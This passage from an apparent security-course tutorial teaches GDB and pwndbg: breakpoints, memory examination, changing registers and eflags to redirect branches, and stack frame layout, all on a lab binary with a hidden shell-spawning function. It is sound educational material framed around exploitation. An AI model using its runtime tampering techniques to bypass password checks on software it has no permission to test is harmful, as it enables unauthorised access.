breakpoint for the start of our program in two ways:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">(gdb) break *main (when the binary is not stripped of symbols)
(gdb) break *0x[main_address_obtained_with_objdump] (when aslr is off)
&lt;/code>&lt;/pre>&lt;p>The general format for setting breakpoints in GDB is as follows:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">(gdb) break [LOCATION] [thread THREADNUM] [if CONDITION]
&lt;/code>&lt;/pre>&lt;p>&lt;em>Issuing the &lt;code>break&lt;/code> command with no parameters will place a breakpoint&lt;/em> &lt;em>at the current address.&lt;/em>&lt;/p>
&lt;p>&lt;em>GDB allows using abbreviated forms for all the commands it supports. Learning these abbreviations comes with time and will greatly improve you work output. Always be on the lookout for using abbreviated commands.&lt;/em>&lt;/p>
&lt;p>The abbreviated command for setting breakpoints is simply &lt;code>b&lt;/code>.&lt;/p>
&lt;h4 id="listing-breakpoints">Listing Breakpoints&lt;/h4>
&lt;p>At any given time all the breakpoints in the program can be displayed using the &lt;code>info breakpoints&lt;/code> command:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">(gdb) info breakpoints
&lt;/code>&lt;/pre>&lt;p>&lt;em>You can also issue the abbreviated form of the command&lt;/em>&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">(gdb) i b
&lt;/code>&lt;/pre>&lt;h4 id="deleting-breakpoints">Deleting Breakpoints&lt;/h4>
&lt;p>Breakpoints can be removed by issuing the &lt;code>delete breakpoints&lt;/code> command followed by the breakpoints number, as it is listed in the output of the
&lt;code>info breakpoints&lt;/code> command.&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">(gdb) delete breakpoints [breakpoint_number]
&lt;/code>&lt;/pre>&lt;p>&lt;em>You can also delete all active breakpoints by issuing the following the&lt;/em> &lt;code>delete breakpoints&lt;/code> command with no parameters:*&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">(gdb) delete breakpoints
&lt;/code>&lt;/pre>&lt;p>Once a breakpoint is set you would normally want to launch the program into execution. You can do this by issuing the &lt;code>run&lt;/code> command. The program will start executing and stop at the first breakpoint you have
set.&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">(gdb) run
&lt;/code>&lt;/pre>&lt;h4 id="execution-flow">Execution flow&lt;/h4>
&lt;p>Execution flow can be controlled in GDB using the &lt;code>continue&lt;/code>, &lt;code>stepi&lt;/code>,&lt;code>nexti&lt;/code> as follows:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">(gdb) help continue
#Continue program being debugged, after signal or breakpoint.
#If proceeding from breakpoint, a number N may be used as an argument,
#which means to set the ignore count of that breakpoint to N - 1 (so that
#the breakpoint won&amp;#39;t break until the Nth time it is reached).
(gdb) help stepi
#Step one instruction exactly.
#Argument N means do this N times (or till program stops for another reason).
(gdb) help nexti
#Step one instruction, but proceed through subroutine calls.
#Argument N means do this N times (or till program stops for another reason).
&lt;/code>&lt;/pre>&lt;p>&lt;em>You can also use the abbreviated format of the commands: &lt;code>c&lt;/code>&lt;/em>
&lt;em>(&lt;code>continue&lt;/code>), &lt;code>si&lt;/code> (&lt;code>stepi&lt;/code>), &lt;code>ni&lt;/code> (&lt;code>nexti&lt;/code>).&lt;/em>&lt;/p>
&lt;p>&lt;em>If at any point you want to start the program execution from the&lt;/em> &lt;em>beginning you can always reissue the &lt;code>run&lt;/code> command.&lt;/em>&lt;/p>
&lt;p>Another technique that can be used for setting breakpoints is using offsets.&lt;/p>
&lt;p>As you already know, each assembly instruction takes a certain number of bytes inside the executable file. This means that whenever you are setting breakpoints using offsets you must always set them at instruction boundaries.&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">(gdb) break *main
Breakpoint 1 at 0x80491d0
(gdb) run
Starting program: sppb
Breakpoint 1, 0x80491d0 in main ()
(gdb) disassemble main
Dump of assembler code for function main:
0x080491c9 &amp;lt;+0&amp;gt;: push ebp
0x080491ca &amp;lt;+1&amp;gt;: mov ebp,esp
0x080491cc &amp;lt;+3&amp;gt;: push ebx
0x080491cd &amp;lt;+4&amp;gt;: sub esp,0x4
.....Output ommited.....
(gdb) break *main+4
Breakpoint 2 at 0x80491cd
&lt;/code>&lt;/pre>&lt;h3 id="examine-and-print-your-most-powerful-tools">Examine and Print, your most powerful tools&lt;/h3>
&lt;p>GDB allows examining of memory locations be them specified as addresses or stored in registers. The &lt;code>x&lt;/code> command (for &lt;em>examine&lt;/em>) is arguably one
of the most powerful tool in your arsenal and the most common command you are going to run when exploiting.&lt;/p>
&lt;p>The format for the &lt;code>examine&lt;/code> command is as follows:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">(gdb) x/nfu [address]
n: How many units to print
f: Format character
a Pointer
c Read as integer, print as character
d Integer, signed decimal
f Floating point number
o Integer, print as octal
s Treat as C string (read all successive memory addresses until null character and print as characters)
t Integer, print as binary (t=&amp;#34;two&amp;#34;)
u Integer, unsigned decimal
x Integer, print as hexadecimal
u: Unit
b: Byte
h: Half-word (2 bytes)
w: Word (4 bytes)
g: Giant word (8 bytes)
i: Instruction (read n assembly instructions from the specified memory address)
&lt;/code>&lt;/pre>&lt;p>In contrast with the examine command, which reads data at a memory location the &lt;code>print&lt;/code> command (shorthand &lt;code>p&lt;/code>) prints out values stored in
registers and variables.&lt;/p>
&lt;p>The format for the &lt;code>print&lt;/code> command is as follows:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">(gdb) p/f [what]
f: Format character
a Pointer
c Read as integer, print as character
d Integer, signed decimal
f Floating point number
o Integer, print as octal
s Treat as C string (read all successive memory addresses until null character and print as characters)
t Integer, print as binary (t=&amp;#34;two&amp;#34;)
u Integer, unsigned decimal
x Integer, print as hexadecimal
i Instruction (read n assembly instructions from the specified memory address)
&lt;/code>&lt;/pre>&lt;p>For a better explanation please follow through with the following example:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">#a breakpoint has been set inside the program and the program has been run with the appropriate commands to reach the breakpoint
#at this point we want to see which are the following 10 instructions
(gdb) x/10i 0x80491cd
0x80491cd &amp;lt;main+4&amp;gt;: sub esp,0x4
0x80491d0 &amp;lt;main+7&amp;gt;: mov eax,ds:0x804c030
0x80491d5 &amp;lt;main+12&amp;gt;: push 0x0
0x80491d7 &amp;lt;main+14&amp;gt;: push 0x1
0x80491d9 &amp;lt;main+16&amp;gt;: push 0x0
0x80491db &amp;lt;main+18&amp;gt;: push eax
0x80491dc &amp;lt;main+19&amp;gt;: call 0x8049080 &amp;lt;setvbuf@plt&amp;gt;
#let&amp;#39;s examine the memory at 0x804a02a because we have a hint that this address holds one of the parameters of the scanf call as it is afterwards placed on the stack (we&amp;#39;ll explain later how we have reached this conclusion)
#the other parameter will be an address where the input will be stored
(gdb) x/s 0x804a02a
0x804a02a: &amp;#34;%d&amp;#34;
# we now set a breakpoint for *main+56
(gdb) break *0x08049201
Breakpoint 3 at 0x08049201
(gdb) continue
Continuing.
Breakpoint 3, 0x08049201 in main ()
We then record the value of the eax register somewhere and use nexti(ni) and then we input an integer.
#let&amp;#39;s examine the address which we recorded earlier corresponding to the eax register (it should&amp;#39;ve held the address for the integer we input)
#take note that in GDB registers are preceded by the &amp;#34;$&amp;#34; character very much like variables
(gdb) x/d 0xffffcf70 &amp;lt;- (your address)
0xffffcf70: &amp;lt;your input&amp;gt;
#now let&amp;#39;s print the contents of the eax register as hexadecimal
(gdb) p/x $eax
$1 = &amp;lt;your input&amp;gt;
The diference between p and x can be observed by issuing the following commands:
x/s 0x804a030
0x804a030: &amp;#34;Your password is: %d. Evaluating it...\n&amp;#34;
p /s 0x804a030
$2 = 1920298841 which is the number in decimal format that &amp;#34;Your&amp;#34; can be translated to by its ascii codes (little endian so written as 0x72756F59).
In order to see the same result we must use the command p /s (char*)0x804a030 and dereference the pointer ourselves
# as you can see the address holds the memory for the beginning of the string
# this shows you how &amp;#34;x&amp;#34; interprets data from memory while &amp;#34;p&amp;#34; merely prints out the contents in the required format
# you can think of it as &amp;#34;x&amp;#34; dereferencing while &amp;#34;p&amp;#34; not dereferencing
&lt;/code>&lt;/pre>&lt;h3 id="gdb-command-file">GDB command file&lt;/h3>
&lt;p>When exploiting, there are a couple of commands that you will issue periodically and doing that by hand will get cumbersome. GDB commands
files will allow you to run a specific set of commands automatically after each command you issue manually. This comes in especially handy
when you're stepping through a program and want to see what happens with the registers and stack after each instruction is ran, which is the
main target when exploiting.&lt;/p>
&lt;p>The examine command only has sense when code is already running on the machine so inside the file we are going to use the display command which
translates to the same output.&lt;/p>
&lt;p>In order to use this option you must first create your commands file. This file can include any GDB commands you like but a good start would
be printing out the content of all the register values, the next ten instructions that are going to be executed, and some portion from the
top of the stack.&lt;/p>
&lt;p>The reason for examining all of the above after each instruction is ran will become more clear once the we go through the second section of the
session.&lt;/p>
&lt;p>Command file template:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">display/10i $eip
display/x $eax
display/x $ebx
display/x $ecx
display/x $edx
display/x $edi
display/x $esi
display/x $ebp
display/32xw $esp
&lt;/code>&lt;/pre>&lt;p>In order to view all register values you could use the &lt;code>x&lt;/code> command.
However the values of all registers can be obtained by running the&lt;code>info all-registers&lt;/code> command:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">(gdb) info all-registers
eax 0x8048630,134514224
ecx 0xbffff404,-1073744892
edx 0xbffff394,-1073745004
ebx 0xb7fc6ff4,-1208193036
esp 0xbffff330,0xbffff330
ebp 0xbffff368,0xbffff368
esi 0x0,0
edi 0x0,0
eip 0x80484e9,0x80484e9 &amp;lt;main+37&amp;gt;
eflags 0x286,[ PF SF IF ]
cs 0x73,115
ss 0x7b,123
ds 0x7b,123
es 0x7b,123
fs 0x0,0
gs 0x33,51
st0 *value not available*
st1 *value not available*
st2 *value not available*
st3 *value not available*
st4 *value not available*
st5 *value not available*
st6 *value not available*
st7 *value not available*
fctrl 0x37f,895
fstat 0x0,0
ftag 0xffff,65535
fiseg 0x0,0
fioff 0x0,0
foseg 0x0,0
---Type &amp;lt;return&amp;gt; to continue, or q &amp;lt;return&amp;gt; to quit---
fooff 0x0,0
fop 0x0,0
mxcsr 0x1f80,[ IM DM ZM OM UM PM ]
ymm0 *value not available*
ymm1 *value not available*
ymm2 *value not available*
ymm3 *value not available*
ymm4 *value not available*
ymm5 *value not available*
ymm6 *value not available*
ymm7 *value not available*
mm0 *value not available*
mm1 *value not available*
mm2 *value not available*
mm3 *value not available*
mm4 *value not available*
mm5 *value not available*
mm6 *value not available*
mm7 *value not available*
&lt;/code>&lt;/pre>&lt;p>&lt;em>One thing you might notice while using GDB is that addresses seem to be pretty similar between runs. Although with experience you will gain a better feel for where an address points to, one thing to remember at this point would be that stack addresses usually have the &lt;code>0xbffff….&lt;/code> format. In order to run GDB with the commands file you have just generated, when launching GDB specify the &lt;code>-x [command_file]&lt;/code> parameter.&lt;/em>&lt;/p>
&lt;h3 id="using-gdb-to-modify-variables">Using GDB to modify variables&lt;/h3>
&lt;p>GDB can be used to modify variables during runtime. In the case of exploitation this comes in handy as the program can be altered at
runtime with the purpose of changing the execution path to desired branches.&lt;/p>
&lt;h3 id="pwndbg">PWNDBG&lt;/h3>
&lt;p>As you can see using GDB can be cumbersome, this is why we recommend using the pwndbg plug-in. The tutorial as well as the repository of the project can be found here &lt;a href="https://github.com/pwndbg/pwndbg" title="https://github.com/pwndbg/pwndbg">Pwndbg&lt;/a>&lt;/p>
&lt;p>Give the fact that pwndbg is just a wrapper, all the functionality of GDB will be available when running gdb with the&lt;code>pwndbg&lt;/code> plug-in. Some of the advantages of using pwngdb include:&lt;/p>
&lt;ol>
&lt;li>Automatic preview of registers, code and stack after each instruction (you no longer need to create your own commands file)&lt;/li>
&lt;li>Automatic dereferencing and following through of memory locations&lt;/li>
&lt;li>Color coding&lt;/li>
&lt;/ol>
&lt;p>An alternative to pwndbg is &lt;a href="https://github.com/hugsy/gef" title="https://github.com/hugsy/gef">Gef&lt;/a>. However, this tutorial is designed with Pwndbg in mind.&lt;/p>
&lt;h4 id="pwndbg-commands">PWNDBG Commands&lt;/h4>
&lt;p>&lt;code>pdis&lt;/code> command gives a pretty output that is similar to what the &lt;code>disas&lt;/code>
command in GDB prints:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">Usage: pdis 0x80491d0
&lt;/code>&lt;/pre>&lt;p>If &lt;code>pdis&lt;/code> is used with an address as a parameter, the output will be similar to what &lt;code>x/Ni&lt;/code> prints out (where N is the number of instructions you want to disassemble) Usage: -pdis [address] [N] - where N is the number of instructions you want to be printed&lt;/p>
&lt;p>The &lt;code>stepi&lt;/code> command has the same effect as in GDB however, if you are running PWNDBG you will notice that after each step PWNDBG will automatically print register values, several lines of code from eip
register and a portion of the stack:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">pwndbg&amp;gt; stepi
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────[ REGISTERS ]────────────────────────────────────
*EAX 0xf7facd20 (_IO_2_1_stdout_) ◂— 0xfbad2084
EBX 0x0
ECX 0xa00af61b
EDX 0xffffcfb4 ◂— 0x0
EDI 0xf7fac000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c
ESI 0xf7fac000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c
EBP 0xffffcf78 ◂— 0x0
ESP 0xffffcf70 —▸ 0xf7fac000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c
*EIP 0x80491d5 (main+12) ◂— push 0 /* &amp;#39;j&amp;#39; */
─────────────────────────────────────[ DISASM ]──────────────────────────────────────
0x80491d0 &amp;lt;main+7&amp;gt; mov eax, dword ptr [stdout@GLIBC_2.0] &amp;lt;0x804c030&amp;gt;
► 0x80491d5 &amp;lt;main+12&amp;gt; push 0
0x80491d7 &amp;lt;main+14&amp;gt; push 1
0x80491d9 &amp;lt;main+16&amp;gt; push 0
0x80491db &amp;lt;main+18&amp;gt; push eax
0x80491dc &amp;lt;main+19&amp;gt; call setvbuf@plt &amp;lt;setvbuf@plt&amp;gt;
0x80491e1 &amp;lt;main+24&amp;gt; add esp, 0x10
0x80491e4 &amp;lt;main+27&amp;gt; mov dword ptr [ebp - 8], 0
0x80491eb &amp;lt;main+34&amp;gt; push 0x804a010
0x80491f0 &amp;lt;main+39&amp;gt; call puts@plt &amp;lt;puts@plt&amp;gt;
0x80491f5 &amp;lt;main+44&amp;gt; add esp, 4
──────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────
In file: /home/kali/Desktop/dokermaker/binary-internal/sessions/05-dynamic-analysis/activities/01-02-challenge-sppb/src/sppb.c
6 execve(&amp;#34;/bin/sh&amp;#34;, 0, 0);
7 }
8
9 int main()
10 {
► 11 setvbuf(stdout, NULL, _IOLBF, 0);
12 int readValue = 0;
13
14 printf(&amp;#34;Please provide password: \n&amp;#34;);
15 scanf(&amp;#34;%d&amp;#34;, &amp;amp;readValue);
16
──────────────────────────────────────[ STACK ]──────────────────────────────────────
00:0000│ esp 0xffffcf70 —▸ 0xf7fac000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c
01:0004│ 0xffffcf74 ◂— 0x0
02:0008│ ebp 0xffffcf78 ◂— 0x0
03:000c│ 0xffffcf7c —▸ 0xf7de0fd6 (__libc_start_main+262) ◂— add esp, 0x10
04:0010│ 0xffffcf80 ◂— 0x1
05:0014│ 0xffffcf84 —▸ 0xffffd024 —▸ 0xffffd1d9 ◂— &amp;#39;/home/kali/Desktop/sppb&amp;#39;
06:0018│ 0xffffcf88 —▸ 0xffffd02c —▸ 0xffffd24d ◂— &amp;#39;COLORFGBG=15;0&amp;#39;
07:001c│ 0xffffcf8c —▸ 0xffffcfb4 ◂— 0x0
────────────────────────────────────[ BACKTRACE ]────────────────────────────────────
► f 0 0x80491d5 main+12
f 1 0xf7de0fd6 __libc_start_main+262
&lt;/code>&lt;/pre>&lt;p>You can always use the following commands to obtain context at any given
moment inside the debug process:&lt;/p>
&lt;ol>
&lt;li>&lt;code>context reg&lt;/code>&lt;/li>
&lt;li>&lt;code>context code&lt;/code>&lt;/li>
&lt;li>&lt;code>context stack&lt;/code>&lt;/li>
&lt;li>&lt;code>context all&lt;/code>&lt;/li>
&lt;/ol>
&lt;p>One additional PWNDBG command which can be used to show values in registers is the &lt;code>telescope&lt;/code> command. The command dereferentiates pointer values until it gets to a value and prints out the entire trace.&lt;/p>
&lt;p>The command can be used with both registers and memory addresses:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">pwndbg$ telescope $esp
00:0000│ esp 0xffffcf70 —▸ 0xf7fac000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c
01:0004│ 0xffffcf74 ◂— 0x0
02:0008│ ebp 0xffffcf78 ◂— 0x0
03:000c│ 0xffffcf7c —▸ 0xf7de0fd6 (__libc_start_main+262) ◂— add esp, 0x10
04:0010│ 0xffffcf80 ◂— 0x1
05:0014│ 0xffffcf84 —▸ 0xffffd024 —▸ 0xffffd1d9 ◂— &amp;#39;/home/kali/Desktop/sppb&amp;#39;
06:0018│ 0xffffcf88 —▸ 0xffffd02c —▸ 0xffffd24d ◂— &amp;#39;COLORFGBG=15;0&amp;#39;
07:001c│ 0xffffcf8c —▸ 0xffffcfb4 ◂— 0x0
pwndbg&amp;gt; telescope 0xffffcf84
00:0000│ 0xffffcf84 —▸ 0xffffd024 —▸ 0xffffd1d9 ◂— &amp;#39;/home/kali/Desktop/sppb&amp;#39;
01:0004│ 0xffffcf88 —▸ 0xffffd02c —▸ 0xffffd24d ◂— &amp;#39;COLORFGBG=15;0&amp;#39;
02:0008│ 0xffffcf8c —▸ 0xffffcfb4 ◂— 0x0
03:000c│ 0xffffcf90 —▸ 0xffffcfc4 ◂— 0xe38ae80b
04:0010│ 0xffffcf94 —▸ 0xf7ffdb60 —▸ 0xf7ffdb00 —▸ 0xf7fc93e0 —▸ 0xf7ffd9a0 ◂— ...
05:0014│ 0xffffcf98 —▸ 0xf7fc9410 —▸ 0x804832d ◂— &amp;#39;GLIBC_2.0&amp;#39;
06:0018│ 0xffffcf9c —▸ 0xf7fac000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c
07:001c│ 0xffffcfa0 ◂— 0x1
&lt;/code>&lt;/pre>&lt;p>In the example above, the memory address 0x8048630 was loaded into EAX. That is why examining the register or the memory location gives the same output.&lt;/p>
&lt;p>For more information on various PWNdbg commands you can always visit the PWNdbg help through the &lt;code>pwndbg&lt;/code> command It is always a better idea to use PWNdbg commands when available. However you should also know the basics of using GDB as well.&lt;/p>
&lt;h4 id="altering-variables-and-memory-with-pwndbg-and-gdb">Altering variables and memory with PWNdbg and GDB&lt;/h4>
&lt;p>In addition to basic registers, GDB has a two extra variables which map onto some of the existing registers, as follows:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>$pc – $eip&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>$sp – $esp&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>$fp – $ebp&lt;/code>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>In addition to these there are also two registers which can be used to view the processor state &lt;code>$ps – processor status&lt;/code>&lt;/p>
&lt;p>Values of memory addresses and registers can be altered at execution time. Because altering memory is a lot easier using PWNdbg we are going to
use it throughout today's session.&lt;/p>
&lt;p>The easiest way of altering the execution flow of a program is editing the &lt;code>$eflags&lt;/code> register just before jump instructions.&lt;/p>
&lt;p>Using GDB the &lt;code>$eflags&lt;/code> register can be easily modified:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">pwndbg&amp;gt; reg eflags
EFLAGS 0x282 [ cf pf af zf SF IF df of ]
Set the ZF flag
pwndbg&amp;gt; set $eflags |= (1 &amp;lt;&amp;lt; 6)
Clear the ZF flag
pwndbg&amp;gt; set $eflags &amp;amp;= ~(1 &amp;lt;&amp;lt; 6)
&lt;/code>&lt;/pre>&lt;p>Notice that the flags that are set are printed in all-caps when the&lt;code>reg eflags&lt;/code> command is issued.&lt;/p>
&lt;p>The &lt;code>set&lt;/code> command (GDB native) can be used to modify values that reside inside memory.&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">pwndbg&amp;gt; telescope 0x804a010
00:0000│ 0x804a010 ◂— &amp;#39;Please provide password: &amp;#39;
01:0004│ 0x804a014 ◂— &amp;#39;se provide password: &amp;#39;
02:0008│ 0x804a018 ◂— &amp;#39;rovide password: &amp;#39;
03:000c│ 0x804a01c ◂— &amp;#39;de password: &amp;#39;
04:0010│ 0x804a020 ◂— &amp;#39;assword: &amp;#39;
05:0014│ 0x804a024 ◂— &amp;#39;ord: &amp;#39;
06:0018│ 0x804a028 ◂— 0x64250020 /* &amp;#39; &amp;#39; */
07:001c│ 0x804a02c ◂— 0x0
pwndbg&amp;gt; set {char [14]} 0x804a010 = &amp;#34;No pass here&amp;#34;
Written 28 bytes to 0x8048630
pwndbg&amp;gt; telescope 0x8048630
00:0000│ 0x804a010 ◂— &amp;#39;No pass here&amp;#39;
01:0004│ 0x804a014 ◂— &amp;#39;ass here&amp;#39;
02:0008│ 0x804a018 ◂— &amp;#39;here&amp;#39;
03:000c│ 0x804a01c ◂— 0x70200000
04:0010│ 0x804a020 ◂— &amp;#39;assword: &amp;#39;
05:0014│ 0x804a024 ◂— &amp;#39;ord: &amp;#39;
06:0018│ 0x804a028 ◂— 0x64250020 /* &amp;#39; &amp;#39; */
07:001c│ 0x804a02c ◂— 0x0
&lt;/code>&lt;/pre>&lt;p>As you can see the string residing in memory at address &lt;code>0x8048630&lt;/code> has been modified using the &lt;code>set&lt;/code> command.&lt;/p>
&lt;p>Pwngdb does not offer enhancements in modifying registry values. For modifying registry values you can use the GDB &lt;code>set&lt;/code> command.&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code}" data-lang="{.code}">pwngdb&amp;gt; p/x $eax
$10 = 0x1
pwngdb&amp;gt; set $eax=0x80
pwngdb&amp;gt; p/x $eax
$11 = 0x80
&lt;/code>&lt;/pre>&lt;h3 id="enough-with-gdb-for-a-while">Enough with GDB (for a while)&lt;/h3>
&lt;p>The following section will describe the process of function calling in detail. Understanding function calling and stack operations during program execution is esential to exploitation.&lt;/p>
&lt;h3 id="the-stack">The Stack&lt;/h3>
&lt;p>The stack is one of the areas of memory which gets the biggest attention in exploitation writing.&lt;/p>
&lt;h4 id="stack-growth">Stack Growth&lt;/h4>
&lt;p>The stack grows from high memory addresses to low memory addresses.&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">pwndbg&amp;gt; pdis $eip
0x80491db &amp;lt;main+18&amp;gt; push eax
0x80491dc &amp;lt;main+19&amp;gt; call setvbuf@plt &amp;lt;setvbuf@plt&amp;gt;
0x80491e1 &amp;lt;main+24&amp;gt; add esp, 0x10
0x80491e4 &amp;lt;main+27&amp;gt; mov dword ptr [ebp - 8], 0
0x80491eb &amp;lt;main+34&amp;gt; push 0x804a010
► 0x80491f0 &amp;lt;main+39&amp;gt; call puts@plt &amp;lt;puts@plt&amp;gt;
pwndbg&amp;gt; p/x $esp
$1 = 0xffffcf6c
pwndbg&amp;gt; si
0x8049050 in puts@plt ()
pwndbg&amp;gt; p/x $esp
$5 = 0xffffcf68
&lt;/code>&lt;/pre>&lt;p>As you can see from the example above the $esp register had an initial value of &lt;code>0xffffcf6c&lt;/code>. The next instruction that is about to be executed is a push (it pushes &lt;code>0x0&lt;/code> on the stack). We execute the instruction and then reevaluate the value of &lt;code>$esp&lt;/code>. As we can see &lt;code>$esp&lt;/code> now points to &lt;code>0xffffcf68&lt;/code> (&lt;code>0xffffcf6c-0x4&lt;/code>).&lt;/p>
&lt;h4 id="frame-pointers-and-local-function-variables">Frame pointers and local function variables&lt;/h4>
&lt;p>Whenever the processor is entering the execution for a function, a special logical container is created on the stack for that function.&lt;/p>
&lt;p>This container is called a function frame. The idea behind it is that the processor must know which area of the stack belongs to which function.&lt;/p>
&lt;p>In order to achieve this logical segmentation a set of 2 instructions are automatically inserted by the compiler at the beginning of each function. Can you tell what they are based on the output below?&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">pwndbg&amp;gt; break main
Breakpoint 1 at 0x80484c8
pwndbg&amp;gt; run
[----------------------------------registers-----------------------------------]
EAX 0xf7fa99e8 (environ) —▸ 0xffffd02c —▸ 0xffffd24d ◂— &amp;#39;COLORFGBG=15;0&amp;#39;
EBX 0x0
ECX 0xb8a6a751
EDX 0xffffcfb4 ◂— 0x0
EDI 0x80490a0 (_start) ◂— xor ebp, ebp
ESI 0x1
EBP 0xffffcf78 ◂— 0x0
ESP 0xffffcf70 ◂— 0x1
EIP 0x80491d0 (main+7) ◂— mov eax, dword ptr [0x804c030]
[-------------------------------------code-------------------------------------]
0x080491c9 &amp;lt;+0&amp;gt;: push ebp
0x080491ca &amp;lt;+1&amp;gt;: mov ebp,esp
0x080491cc &amp;lt;+3&amp;gt;: push ebx
0x080491cd &amp;lt;+4&amp;gt;: sub esp,0x4
=&amp;gt; 0x080491d0 &amp;lt;+7&amp;gt;: mov eax,ds:0x804c030
0x080491d5 &amp;lt;+12&amp;gt;: push 0x0
0x080491d7 &amp;lt;+14&amp;gt;: push 0x1
0x080491d9 &amp;lt;+16&amp;gt;: push 0x0
0x080491db &amp;lt;+18&amp;gt;: push eax
[------------------------------------stack-------------------------------------]
00:0000│ esp 0xffffcf70 ◂— 0x1
01:0004│ 0xffffcf74 ◂— 0x0
02:0008│ ebp 0xffffcf78 ◂— 0x0
03:000c│ 0xffffcf7c —▸ 0xf7dda905 (__libc_start_main+229) ◂— add esp, 0x10
04:0010│ 0xffffcf80 ◂— 0x1
05:0014│ 0xffffcf84 —▸ 0xffffd024 —▸ 0xffffd1d9 ◂— &amp;#39;/home/kali/Desktop/sppb&amp;#39;
06:0018│ 0xffffcf88 —▸ 0xffffd02c —▸ 0xffffd24d ◂— &amp;#39;COLORFGBG=15;0&amp;#39;
07:001c│ 0xffffcf8c —▸ 0xffffcfb4 ◂— 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Breakpoint 1, 0x080491d0 in main ()
pwndbg&amp;gt; disass password_accepted
0x080491b2 &amp;lt;+0&amp;gt;: push ebp
0x080491b3 &amp;lt;+1&amp;gt;: mov ebp,esp
0x080491b5 &amp;lt;+3&amp;gt;: push 0x0
0x080491b7 &amp;lt;+5&amp;gt;: push 0x0
0x080491b9 &amp;lt;+7&amp;gt;: push 0x804a008
0x080491be &amp;lt;+12&amp;gt;: call 0x8049070 &amp;lt;execve@plt&amp;gt;
0x080491c3 &amp;lt;+17&amp;gt;: add esp,0xc
0x080491c6 &amp;lt;+20&amp;gt;: nop
0x080491c7 &amp;lt;+21&amp;gt;: leave
0x080491c8 &amp;lt;+22&amp;gt;: ret
&lt;/code>&lt;/pre>&lt;p>What we did is we created a breakpoint for the start of the main function and then ran the program. As you can see the first 2 instructions that got executed were &lt;code>push ebp&lt;/code> and &lt;code>mov ebp,esp&lt;/code>.&lt;/p>
&lt;p>We then set a breakpoint for another function called &lt;code>pass_accepted&lt;/code>, continued execution and entered a password that we know is going to pass validation. Once the breakpoint is hit, we can see the same 2 instructions &lt;code>push ebp&lt;/code> and &lt;code>mov ebp,esp&lt;/code>.&lt;/p>
&lt;p>The two instructions which can be noticed at the beginning of any function are the instructions required for creating the logical container for each function on the stack.&lt;/p>
&lt;p>In essence what they do is save the reference of the old container (&lt;code>push ebp&lt;/code>) and record the current address at the top of the stack as the beginning of the new container(&lt;code>mov ebp,esp&lt;/code>).&lt;/p>
&lt;p>For a visual explanation please see below:&lt;/p>
&lt;p align="center">
&lt;img src="https://security.cs.pub.ro/summer-school/wiki/_media/session/s5_frame_pointer_picture.jpg?w=300&amp;tok=e38db5" alt="Sublime's custom image"/>
&lt;/p>
&lt;p>As you can see the EBP register always points to the stack address that corresponds to the beginning of the current function's frame. That is why it is most often referred to as the frame pointer.&lt;/p>
&lt;p>In addition to the two instructions required for creating a new stack frame for a function, there are a couple more instructions that you will usually see at the beginning of a function&lt;/p>
&lt;p>If you analyze the instructions at the beginning of main, you can spot these as being:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>An &lt;code>and esp,0xfffffff0&lt;/code> instruction.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>A &lt;code>sub&lt;/code> insctruction that subtracts a hex value from ESP.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>The first of the two instructions has the purpose of aligning the stack to a specific address boundary. This is done to increase processor efficiency. In our specific case, the top of the stack gets aligned to a 16 byte multiple address.&lt;/p>
&lt;p>One of the purposes of the stack inside functions is that of offering address space in which to place local variables. The second instruction preallocates space for local function variables.&lt;/p>
&lt;p>Let's see how local variables are handled inside assembly code.&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">#include &amp;lt;stdio.h&amp;gt;
int main()
{
int a;
a=1;
return 0;
}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-{.code" data-lang="{.code">kali@kali:~/sss$ gdb test
GNU gdb (Ubuntu/Linaro 7.4-2012.02-0ubuntu2) 7.4-2012.02
Copyright (C) 2012 Free Software Foundation, Inc.
